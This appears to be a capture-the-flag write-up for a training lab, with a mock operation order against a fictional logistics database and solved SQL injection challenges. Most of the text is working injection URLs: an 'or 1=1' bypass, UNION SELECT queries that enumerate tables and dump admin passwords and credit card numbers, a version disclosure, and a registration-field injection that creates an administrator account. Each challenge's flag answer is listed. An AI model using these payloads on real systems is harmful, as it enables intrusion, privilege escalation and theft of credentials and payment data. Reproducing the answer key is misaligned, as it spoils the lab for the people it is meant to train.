## SQL Injection Challanges

```
Donovian Database Exploitation (DWDBE)
XX Dec 2026
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.

Tools/Techniques: All connections will be established through web browser to donovian-nla. SSH masquerade to Donovian_Webserver with provide credentials. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 5QL1nj3ct5t@rt0F@ct1v1ty

Prior Approvals: SQLi injects through web browser. Creation of database administrator account if directed to. Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.

Scheme of Maneuver:
>internet_grey_host
->T1:10.100.28.48

Target Section:

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
```


```
DNLA Category
5
Level II Challenge
On the DNLA site identify the flag using the Categories page.

To answer input the characters inside the flag.

http://10.100.28.48/cases/productsCategory.php?category=3%20or%201=1

FLAG: 5VeLZxR9CwzwRalmm34S

```

```
Tables
5
Level II Challenge
How many tables are able to be identified through Injection of the web database?
http://10.100.28.48/cases/productsCategory.php?category=4%20UNION%20SELECT%20table_schema,table_name,column_name%20from%20information_schema.columns#


# Go to the bottom and count

FLAG: 8
```


```
Admin credentials
5
Level II Challenge
Provide the password for users with administrator access to the DNLA database. To answer input the flag.
http://10.100.28.48/cases/productsCategory.php?category=4%20UNION%20SELECT%20password,username,permission%20from%20sqlinjection.members#

FLAG: G7fT6K2WuUAPqOR1gbSX
```

```
Products
5
Level II Challenge
Utilizing the Search page on DNLA, identify the flag. To answer input only the characters inside the flag.

http://10.100.28.48/cases/productsCategory.php?category=4%20UNION%20SELECT%20id,name,description%20from%20sqlinjection.products#

FLAG: 5VeLZxR9CwzwRalmm34S
```

```
SQL version
5
Level II Challenge
Identify the version of the database that DNLA is utilizing.

To answer input the full version.

http://10.100.28.48/cases/productsCategory.php?category=4%20UNION%20SELECT%20@@version,2,3%20#

FLAG: 10.1.48-MariaDB-0ubuntu0.18.04.1
```

```
Credit card
5
Level II Challenge
Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.

http://10.100.28.48/cases/productsCategory.php?category=4%20UNION%20SELECT%20id,creditcard_number,date%20from%20sqlinjection.payments

FLAG: OsJUXcIE9OEOAy6TBqHs
```

```
Id search
5
Level II Challenge
Find the flag associated with id 1337.

http://10.100.28.48/cases/productsCategory.php?category=3%20UNION%20SELECT%20comment,data,id%20from%20sqlinjection.share4#

http://10.100.28.48/cases/productsCategory.php?category=3%20UNION%20SELECT%20mime,data,id%20from%20sqlinjection.share4#

SnZucnBMZFNwbXNjZ3kwaHFZS0oK covert from base 64

FLAG: JvnrpLdSpmscgy0hqYKJ
```

```
Create an Admin User
8
Level III Challenge
Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.


C','C','C',1)#

FLAG: pzu8phCpVcUrazfOisjM
```
